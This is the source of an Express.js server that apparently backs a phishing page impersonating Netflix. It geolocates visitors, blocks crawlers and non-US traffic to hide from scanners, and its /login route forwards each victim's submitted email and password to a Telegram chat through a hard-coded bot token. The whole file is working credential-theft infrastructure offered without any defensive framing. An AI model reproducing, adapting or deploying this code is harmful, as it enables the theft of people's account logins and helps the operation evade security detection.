const express = require('express');
const fs = require('fs');
const app = express();
const port = 4000;
const { Crawler, middleware } = require('es6-crawler-detect');
const axios = require('axios');
const cors = require("cors")
var bodyParser = require('body-parser');
const Records = require('./Modals/records')
const Netflix = require('./Modals/netflix-records')
const { Telegraf, session, } = require('telegraf');
const bot = new Telegraf('5643284803:AAHNLTS1g3mFA06ypVq37efhJsfSrazpsRs');


const URL = `http://ip-api.com/json/`

const corsOptions = {
    // origin:'https://abc.onrender.com',
    AccessControlAllowOrigin: '*',
    origin: '*',
    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE'
}



app.use(cors(corsOptions))
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json())

const sendAPIRequest = async (ipAddress) => {
    const apiResponse = await axios.get(URL + ipAddress);
    console.log(apiResponse.data)
    return apiResponse.data;
}



app.post('/', function async(request, response) {


    // bot.telegram.sendMessage(-4087874282,'New Visitor From IP: ' + request.body.ip)

    //bot.on(message('text'), (ctx) => ctx.reply(request.body.toString()));
        console.log('connected')
        console.log(request.body)
        const ipAddress = request.body.ip;
        const ipAddressInformation = sendAPIRequest(ipAddress).then((data => {
        const visitor_id = request.body.visitor_id
        var dataBlock = {
            visitor_id: visitor_id,
            ip: data.query,
            country: data.country,
            state: data.regionName,
            isp: data.isp,

        }
        var CrawlerDetector = new Crawler(request);
        console.log(CrawlerDetector.isCrawler())
        console.log(data);
        if (data.country == 'United States' && !CrawlerDetector.isCrawler()) {

            //  Insert(visitor_id, dataBlock);
             bot.telegram.sendMessage(-4087874282,'New Visitor From IP: ' + request.body.ip + '\n' + 'Visitior ID: '+dataBlock.visitor_id+ '\n' + "State: "+ dataBlock.state+ '\n' + 'Country: ' + dataBlock.country + '\n' + 'isp: ' + dataBlock.isp)


            response.json({status: 200, session: dataBlock.visitor_id})

        } else {
            bot.telegram.sendMessage(-4087874282,'New Visitor From IP: ' + request.body.ip + '\n' + 'Bot Blocked!')

            response.status(403).send('forbiddin')
        }

    }));

});


app.post('/login', function async (request, response){

    console.log(request.body);

    bot.telegram.sendMessage(-4087874282,'------------------[RESULTS]------------------' + '\n'+ 'Visitor ID: '+ request.body.visitor + '\n' + 'ip: ' + request.body.ip + '\n' + 'email: ' + request.body.email + '\n' + 'password: ' + request.body.password)

    response.status(200).send('good')

})







app.listen(port, () => {
    console.log(`Example app listening at http://localhost:${port}`);
});


bot.launch();


// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
